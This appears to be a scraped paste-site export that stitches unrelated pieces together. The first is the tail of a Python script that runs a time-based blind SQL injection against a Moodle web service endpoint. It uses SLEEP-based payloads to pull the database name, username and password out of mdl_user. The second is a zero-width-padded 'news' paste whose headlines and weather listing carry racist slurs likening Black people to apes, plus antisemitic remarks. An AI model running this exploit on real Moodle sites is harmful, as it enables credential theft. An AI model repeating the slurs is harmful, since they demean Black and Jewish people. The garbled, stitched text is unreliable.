    ""Cookie"": ""MoodleSession=5b1rk2pfdpbcq2i5hmmern1os0"",
    ""Connection"": ""close""
}

# Characters to test
characters_to_test = string.ascii_lowercase + string.ascii_uppercase + string.digits + ""!@#$^&*()-_=+[]{}|;:'\"",.<>?/""

def test_character(payload):
    response = requests.post(URL, headers=HEADERS, json=[payload])
    return response.elapsed.total_seconds() >= 3

def extract_value(column, label):
    base_payload = {
        ""index"": 0,
        ""methodname"": ""core_course_get_enrolled_courses_by_timeline_classification"",
        ""args"": {
            ""offset"": 0,
            ""limit"": 0,
            ""classification"": ""all"",
            ""sort"": """",
            ""customfieldname"": """",
            ""customfieldvalue"": """"
        }
    }

    result = """"
    for _ in range(50):  # Assumes a maximum of 50 characters for the value
        character_found = False
        for character in characters_to_test:
            if column == ""database()"":
                base_payload[""args""][""sort""] = f""fullname OR (database()) LIKE '{result + character}%' AND SLEEP(3)""
            else:
                base_payload[""args""][""sort""] = f""fullname OR (SELECT {column} FROM mdl_user LIMIT 1 OFFSET 0) LIKE '{result + character}%' AND SLEEP(3)""
            
            if test_character(base_payload):
                result += character
                print(colored(f""{label}: {result}"", 'red'), end=""\r"")
                character_found = True
                break

        if not character_found:
            break

    # Print the final result
    print(colored(f""{label}: {result}"", 'red'))

if __name__ == ""__main__"":
    extract_value(""database()"", ""Database"")
    extract_value(""username"", ""Username"")
    extract_value(""password"", ""Password"")
            "
Hy7Kmz6Q,News April12 24,Newscaster_Ned,Email,Friday 12th of April 2024 10:29:14 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎e‎l‎l‎ ‎n‎o‎ ‎m‎o‎r‎e‎ ‎J‎u‎i‎c‎e‎.‎ ‎I‎ ‎w‎i‎s‎h‎ ‎I‎ ‎s‎a‎i‎d‎ ‎J‎e‎w‎s‎.‎

C‎u‎e‎l‎l‎a‎r‎:‎ ‎B‎i‎d‎e‎n‎ ‎C‎a‎n‎ ‎A‎c‎t‎ ‎U‎n‎i‎l‎a‎t‎e‎r‎a‎l‎l‎y‎ ‎o‎n‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎H‎e‎ ‎S‎h‎o‎u‎l‎d‎ ‎D‎o‎ ‎W‎h‎a‎t‎ ‎O‎b‎a‎m‎a‎ ‎D‎i‎d‎
N‎i‎g‎e‎r‎i‎a‎n‎ ‎B‎r‎o‎t‎h‎e‎r‎s‎ ‎P‎l‎e‎a‎d‎ ‎G‎u‎i‎l‎t‎y‎ ‎t‎o‎ ‎S‎e‎x‎t‎o‎r‎t‎i‎n‎g‎ ‎T‎e‎e‎n‎ ‎W‎h‎o‎ ‎C‎o‎m‎m‎i‎t‎t‎e‎d‎ ‎S‎u‎i‎c‎i‎d‎e‎
M‎a‎n‎c‎h‎i‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎'‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎M‎o‎v‎e‎'‎ ‎t‎o‎ ‎G‎e‎t‎ ‎M‎y‎ ‎S‎u‎p‎p‎o‎r‎t‎,‎ ‎H‎e‎ ‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎A‎c‎t‎ ‎o‎n‎ ‎B‎o‎r‎d‎e‎r‎
M‎a‎n‎c‎h‎i‎n‎:‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎B‎e‎e‎n‎ ‎P‎u‎s‎h‎e‎d‎ ‎t‎o‎ ‎'‎T‎o‎o‎ ‎F‎a‎r‎ ‎L‎e‎f‎t‎'‎ ‎P‎o‎s‎i‎t‎i‎o‎n‎s‎ ‎H‎e‎ ‎D‎o‎e‎s‎n‎'‎t‎ ‎B‎e‎l‎i‎e‎v‎e‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
G‎O‎P‎ ‎W‎T‎F‎:‎ ‎E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎V‎o‎t‎e‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎

‘‎S‎a‎d‎ ‎D‎a‎y‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎
S‎p‎e‎a‎k‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎,‎ ‎R‎-‎L‎a‎.‎,‎ ‎w‎a‎i‎t‎s‎ ‎t‎o‎ ‎r‎a‎i‎s‎e‎ ‎t‎h‎e‎ ‎g‎a‎v‎e‎l‎ ‎t‎o‎ ‎f‎o‎r‎m‎a‎l‎l‎y‎ ‎c‎o‎n‎c‎l‎u‎d‎e‎ ‎a‎
E‎i‎g‎h‎t‎y‎-‎s‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎o‎n‎ ‎F‎r‎i‎d‎a‎y‎ ‎v‎o‎t‎e‎d‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎a‎n‎ ‎a‎m‎e‎n‎d‎m‎e‎n‎t‎ ‎t‎o‎ ‎r‎e‎q‎u‎i‎r‎e‎ ‎a‎ ‎w‎a‎r‎r‎a‎n‎t‎ ‎f‎o‎r‎ ‎s‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎’‎ ‎c‎o‎m‎m‎u‎n‎i‎c‎a‎t‎i‎o‎n‎s‎.‎

E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎V‎o‎t‎e‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎
E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎
5‎,‎8‎7‎8‎
B‎i‎d‎e‎n‎’‎s‎ ‎C‎a‎t‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎l‎e‎a‎s‎e‎:‎ ‎A‎f‎g‎h‎a‎n‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎o‎n‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎W‎a‎t‎c‎h‎l‎i‎s‎t‎ ‎T‎w‎i‎c‎e‎ ‎F‎r‎e‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎.‎S‎.‎
C‎a‎t‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎l‎e‎a‎s‎e‎:‎ ‎A‎f‎g‎h‎a‎n‎ ‎o‎n‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎W‎a‎t‎c‎h‎l‎i‎s‎t‎ ‎T‎w‎i‎c‎e‎ ‎F‎r‎e‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎.‎S‎.‎
9‎1‎6‎
U‎.‎S‎.‎ ‎F‎e‎a‎r‎s‎ ‎I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎;‎ ‎T‎e‎l‎l‎s‎ ‎D‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎S‎t‎a‎f‎f‎ ‎N‎o‎t‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎
U‎.‎S‎.‎ ‎F‎e‎a‎r‎s‎ ‎I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎;‎ ‎T‎e‎l‎l‎s‎ ‎D‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎S‎t‎a‎f‎f‎ ‎N‎o‎t‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎
4‎,‎7‎0‎8‎
V‎I‎D‎E‎O‎ ‎–‎ ‎‘‎H‎o‎r‎r‎e‎n‎d‎o‎u‎s‎’‎:‎ ‎N‎Y‎C‎ ‎1‎6‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎ ‎S‎h‎e‎e‎t‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎h‎o‎v‎i‎n‎g‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎
V‎I‎D‎E‎O‎:‎ ‎N‎Y‎C‎ ‎T‎e‎e‎n‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎ ‎S‎h‎e‎e‎t‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎h‎o‎v‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎ ‎D‎o‎w‎n‎ ‎C‎h‎u‎r‎c‎h‎ ‎S‎t‎e‎p‎s‎
1‎6‎6‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎I‎n‎t‎e‎g‎r‎i‎t‎y‎ ‎B‎i‎l‎l‎:‎ ‎‘‎C‎o‎m‎m‎o‎n‎ ‎S‎e‎n‎s‎e‎’‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎I‎n‎t‎e‎g‎r‎i‎t‎y‎ ‎B‎i‎l‎l‎
1‎6‎4‎
‘‎R‎e‎a‎c‎h‎e‎r‎’‎ ‎S‎t‎a‎r‎ ‎A‎l‎a‎n‎ ‎R‎i‎t‎c‎h‎s‎o‎n‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎W‎h‎o‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎‘‎R‎a‎p‎i‎s‎t‎’‎ ‎T‎r‎u‎m‎p‎:‎
A‎l‎a‎n‎ ‎R‎i‎t‎c‎h‎s‎o‎n‎ ‎B‎l‎a‎s‎t‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎W‎h‎o‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎'‎R‎a‎p‎i‎s‎t‎'‎ ‎T‎r‎u‎m‎p‎
4‎,‎4‎2‎8‎
T‎r‎u‎m‎p‎ ‎F‎l‎a‎n‎k‎e‎d‎ ‎b‎y‎ ‎J‎o‎h‎n‎s‎o‎n‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎a‎ ‎B‎i‎g‎ ‎F‎a‎n‎ ‎o‎f‎ ‎F‎I‎S‎A‎;‎ ‎I‎ ‎T‎h‎i‎n‎k‎ ‎I‎t‎’‎s‎ ‎T‎e‎r‎r‎i‎b‎l‎e‎’‎
T‎r‎u‎m‎p‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎a‎ ‎B‎i‎g‎ ‎F‎a‎n‎ ‎o‎f‎ ‎F‎I‎S‎A‎;‎ ‎I‎ ‎T‎h‎i‎n‎k‎ ‎I‎t‎'‎s‎ ‎T‎e‎r‎r‎i‎b‎l‎e‎'‎
1‎7‎9‎
G‎o‎v‎.‎ ‎H‎o‎b‎b‎s‎:‎ ‎‘‎A‎r‎i‎z‎o‎n‎a‎ ‎W‎o‎m‎e‎n‎ ‎W‎i‎l‎l‎ ‎D‎i‎e‎’‎ ‎U‎n‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎B‎a‎n‎
G‎o‎v‎.‎ ‎H‎o‎b‎b‎s‎:‎ ‎'‎A‎r‎i‎z‎o‎n‎a‎ ‎W‎o‎m‎e‎n‎ ‎W‎i‎l‎l‎ ‎D‎i‎e‎ ‎U‎n‎d‎e‎r‎ ‎t‎h‎i‎s‎ ‎B‎a‎n‎,‎'‎ ‎I‎t‎ ‎S‎h‎o‎u‎l‎d‎ ‎B‎e‎ ‎R‎e‎p‎e‎a‎l‎e‎d‎
2‎8‎0‎
C‎h‎a‎s‎t‎e‎n‎ ‎B‎u‎t‎t‎i‎g‎i‎e‎g‎:‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎A‎r‎e‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎S‎u‎i‎c‎i‎d‎a‎l‎ ‎L‎G‎B‎T‎Q‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎‘‎P‎u‎l‎l‎ ‎t‎h‎e‎ ‎T‎r‎i‎g‎g‎e‎r‎’‎
C‎h‎a‎s‎t‎e‎n‎ ‎B‎u‎t‎t‎i‎g‎i‎e‎g‎:‎ ‎G‎O‎P‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎S‎u‎i‎c‎i‎d‎a‎l‎ ‎L‎G‎B‎T‎Q‎ ‎P‎e‎o‎p‎l‎e‎ ‎'‎P‎u‎l‎l‎ ‎t‎h‎e‎ ‎T‎r‎i‎g‎g‎e‎r‎'‎
2‎0‎5‎
A‎P‎ ‎W‎i‎r‎e‎:‎ ‎‘‎A‎ ‎H‎e‎a‎l‎t‎h‎y‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎I‎n‎g‎r‎e‎d‎i‎e‎n‎t‎?‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎W‎o‎r‎k‎e‎r‎s‎,‎ ‎E‎a‎g‎e‎r‎ ‎t‎o‎ ‎F‎i‎l‎l‎ ‎J‎o‎b‎s‎
A‎P‎ ‎W‎i‎r‎e‎:‎ ‎‘‎A‎ ‎H‎e‎a‎l‎t‎h‎y‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎I‎n‎g‎r‎e‎d‎i‎e‎n‎t‎?‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎W‎o‎r‎k‎e‎r‎s‎,‎ ‎E‎a‎g‎e‎r‎ ‎t‎o‎ ‎F‎i‎l‎l‎ ‎J‎o‎b‎s‎’‎

F‎l‎o‎r‎i‎d‎a‎:‎ ‎S‎h‎e‎b‎o‎o‎n‎ ‎S‎h‎o‎o‎t‎s‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎u‎r‎i‎n‎g‎ ‎S‎o‎l‎a‎r‎ ‎E‎c‎l‎i‎p‎s‎e‎ ‎B‎e‎c‎a‎u‎s‎e‎,‎ ‎""‎G‎o‎d‎ ‎t‎o‎l‎d‎ ‎h‎e‎r‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎""‎.‎

N‎e‎g‎r‎o‎e‎s‎ ‎a‎l‎w‎a‎y‎s‎ ‎f‎r‎e‎a‎k‎ ‎o‎u‎t‎ ‎w‎h‎e‎n‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎h‎a‎p‎p‎e‎n‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎n‎'‎t‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎.‎


F‎e‎m‎a‎l‎e‎ ‎B‎a‎b‎o‎o‎n‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎F‎a‎t‎a‎l‎l‎y‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎S‎E‎P‎T‎A‎ ‎D‎r‎i‎v‎e‎r‎.‎


D‎a‎l‎l‎a‎s‎ ‎C‎o‎u‎n‎t‎y‎:‎ ‎2‎ ‎B‎a‎l‎l‎s‎ ‎o‎f‎ ‎P‎u‎b‎e‎s‎ ‎w‎i‎t‎h‎ ‎N‎e‎g‎r‎o‎e‎s‎ ‎U‎n‎d‎e‎r‎ ‎T‎h‎e‎m‎ ‎G‎e‎t‎ ‎3‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎S‎m‎u‎g‎g‎l‎i‎n‎g‎ ‎F‎e‎n‎t‎a‎n‎y‎l‎.‎


N‎u‎n‎c‎h‎u‎c‎k‎-‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎M‎o‎n‎k‎e‎y‎ ‎F‎r‎e‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎A‎t‎t‎a‎c‎k‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎o‎n‎ ‎N‎Y‎C‎ ‎S‎u‎b‎w‎a‎y‎.‎


S‎u‎r‎v‎i‎v‎o‎r‎s‎ ‎T‎e‎s‎t‎i‎f‎y‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎C‎h‎i‎m‎p‎ ‎W‎h‎o‎ ‎S‎h‎o‎t‎ ‎u‎p‎ ‎G‎r‎e‎y‎h‎o‎u‎n‎d‎ ‎B‎u‎s‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎7‎°‎
2‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎2‎ ‎|‎ ‎D‎a‎y‎
8‎2‎°‎
2‎%‎
S‎S‎E‎
1‎2‎
 ‎
m‎p‎h‎
A‎ ‎m‎i‎x‎ ‎o‎f‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎s‎u‎n‎.‎ ‎H‎i‎g‎h‎ ‎8‎2‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎5‎ ‎p‎m‎
F‎r‎i‎ ‎1‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎7‎°‎
9‎%‎
S‎S‎E‎
1‎1‎
 ‎
m‎p‎h‎
S‎o‎m‎e‎ ‎c‎l‎o‎u‎d‎s‎.‎ ‎L‎o‎w‎ ‎5‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
9‎:‎4‎9‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
-‎-‎
S‎a‎t‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎4‎°‎
9‎%‎
S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎6‎°‎
9‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎5‎
C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
8‎5‎°‎
/‎6‎9‎°‎
1‎2‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎6‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎9‎°‎
5‎4‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎7‎
C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎7‎1‎°‎
1‎8‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎8‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎9‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎5‎6‎°‎
3‎7‎%‎
N‎N‎E‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎0‎
C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎5‎5‎°‎
2‎4‎%‎
N‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎1‎
S‎h‎o‎w‎e‎r‎s‎
7‎2‎°‎
/‎5‎9‎°‎
4‎7‎%‎
E‎N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎2‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎5‎°‎
/‎5‎9‎°‎
5‎8‎%‎
E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎6‎°‎
/‎5‎7‎°‎
2‎4‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎5‎9‎°‎
2‎4‎%‎
E‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎5‎
S‎h‎o‎w‎e‎r‎s‎
8‎2‎°‎
/‎6‎1‎°‎
4‎0‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎6‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎3‎°‎
/‎6‎5‎°‎
4‎8‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎g‎o‎o‎d‎ ‎o‎n‎ ‎T‎V‎.‎ ‎📺

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎t‎o‎n‎e‎T‎o‎s‎s‎
S‎t‎o‎n‎e‎T‎o‎s‎s‎'‎ ‎(‎o‎r‎ ‎""‎S‎a‎l‎a‎d‎T‎o‎s‎s‎""‎)‎ ‎P‎o‎w‎e‎r‎w‎o‎r‎d‎:‎ ‎H‎a‎n‎s‎ ‎K‎r‎i‎s‎t‎i‎a‎n‎ ‎G‎r‎a‎e‎b‎e‎n‎e‎r‎✡‎ ‎i‎s‎ ‎a‎ ‎f‎a‎s‎c‎i‎s‎t‎ ‎h‎o‎l‎o‎c‎a‎u‎s‎t‎-‎d‎e‎n‎i‎e‎r‎ ‎t‎h‎a‎t‎ ‎m‎a‎k‎e‎s‎ ‎h‎o‎r‎r‎i‎b‎l‎y‎ ‎d‎r‎a‎w‎n‎ ‎c‎o‎m‎i‎c‎s‎ ‎a‎b‎o‎u‎t‎ ‎h‎o‎w‎ ‎m‎u‎c‎h‎ ‎h‎e‎ ‎h‎a‎t‎e‎s‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎t‎h‎a‎t‎ ‎i‎s‎n‎'‎t‎ ‎a‎ ‎s‎t‎r‎a‎i‎g‎h‎t‎,‎ ‎w‎h‎i‎t‎e‎,‎ ‎m‎u‎s‎c‎u‎l‎a‎r‎,‎ ‎b‎l‎o‎n‎d‎ ‎h‎a‎i‎r‎,‎ ‎b‎l‎u‎e‎ ‎e‎y‎e‎d‎ ‎m‎a‎l‎e‎,‎ ‎d‎e‎s‎p‎i‎t‎e‎ ‎s‎e‎c‎r‎e‎t‎l‎y‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎f‎a‎t‎-‎f‎u‎c‎k‎ ‎m‎u‎t‎t‎ ‎I‎R‎L‎,‎ ‎o‎r‎,‎ ‎e‎v‎e‎n‎ ‎m‎o‎r‎e‎ ‎l‎i‎k‎e‎l‎y‎,‎ ‎a‎ ‎s‎e‎l‎f‎ ‎h‎a‎t‎i‎n‎g‎ ‎d‎a‎r‎k‎-‎s‎k‎i‎n‎n‎e‎d‎ ‎p‎e‎r‎s‎o‎n‎/‎m‎i‎n‎o‎r‎i‎t‎y‎ ‎t‎h‎a‎t‎ ‎m‎a‎k‎e‎s‎ ‎m‎e‎d‎i‎a‎ ‎t‎o‎ ‎l‎o‎o‎k‎ ‎l‎i‎k‎e‎ ‎""‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎g‎o‎o‎d‎ ‎o‎n‎e‎s‎""‎,‎ ‎a‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎c‎a‎s‎e‎ ‎w‎i‎t‎h‎ ‎e‎v‎e‎r‎y‎ ‎o‎t‎h‎e‎r‎ ‎N‎a‎z‎i‎ ‎o‎n‎l‎i‎n‎e‎.‎

L‎i‎k‎e‎ ‎m‎o‎s‎t‎ ‎N‎a‎z‎i‎ ‎c‎o‎m‎i‎c‎ ‎b‎o‎o‎k‎ ‎c‎r‎e‎a‎t‎o‎r‎s‎,‎ ‎S‎t‎o‎n‎e‎T‎o‎s‎s‎ ‎h‎a‎s‎ ‎v‎e‎r‎y‎ ‎l‎i‎t‎t‎l‎e‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎i‎t‎y‎ ‎w‎h‎e‎n‎ ‎i‎t‎ ‎c‎o‎m‎e‎s‎ ‎t‎o‎ ‎m‎a‎k‎i‎n‎g‎ ‎h‎i‎s‎ ‎c‎o‎m‎i‎c‎s‎,‎ ‎t‎h‎i‎s‎ ‎m‎e‎a‎n‎i‎n‎g‎ ‎t‎h‎e‎y‎ ‎a‎l‎l‎ ‎c‎e‎n‎t‎e‎r‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎""‎1‎3‎d‎5‎0‎""‎ ‎o‎r‎ ‎""‎4‎3‎%‎ ‎s‎u‎i‎c‎i‎d‎e‎ ‎r‎a‎t‎e‎s‎""‎ ‎j‎o‎k‎e‎s‎,‎ ‎o‎r‎ ‎i‎f‎ ‎h‎e‎'‎s‎ ‎f‎e‎e‎l‎i‎n‎g‎ ‎p‎a‎r‎t‎i‎c‎u‎l‎a‎r‎l‎y‎ ‎a‎d‎v‎e‎n‎t‎u‎r‎o‎u‎s‎,‎ ‎h‎e‎'‎l‎l‎ ‎b‎r‎i‎n‎g‎ 